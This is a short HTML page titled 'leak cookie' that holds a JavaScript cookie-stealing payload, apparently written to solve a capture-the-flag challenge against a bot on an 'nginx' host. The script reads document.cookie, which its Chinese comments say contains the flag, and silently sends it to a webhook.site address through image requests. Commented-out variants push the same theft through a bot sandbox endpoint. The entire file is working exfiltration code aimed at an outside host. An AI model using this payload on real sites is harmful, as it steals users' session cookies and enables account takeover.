<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>leak cookie</title>
</head>
<body>
<script>
// 读取当前同源域名下全部cookie（nginx域，包含FLAG）

const cookie = document.cookie;
// 替换成你自己的webhook.site地址
const hook = "https://webhook.site/2d648064-4f36-49a7-b61f-54a70a520f9c";
// 拼接泄露链接，encodeURIComponent防止特殊字符截断cookie
new Image().src = hook;
const leakUrl = hook + "?data=" + encodeURIComponent(cookie);
// 创建图片GET请求带出数据，无弹窗、无交互、静默发送
new Image().src = leakUrl;
//new Image().src = "http://nginx/bot/sandbox?target=http%3A%2F%2Fnginx%2F%3Furl%3Dhttps%3A%2F%2Fwebhook.site%2F2d648064-4f36-49a7-b61f-54a70a520f9c"
//new Image().src = "http://nginx/bot/sandbox?target=http%3A%2F%2Fnginx%2F%3Furl%3Dhttps%3A%2F%2Fwebhook.site%2F2d648064-4f36-49a7-b61f-54a70a520f9c?c="+encodeURIComponent(document.cookie)

</script>
</body>
</html>
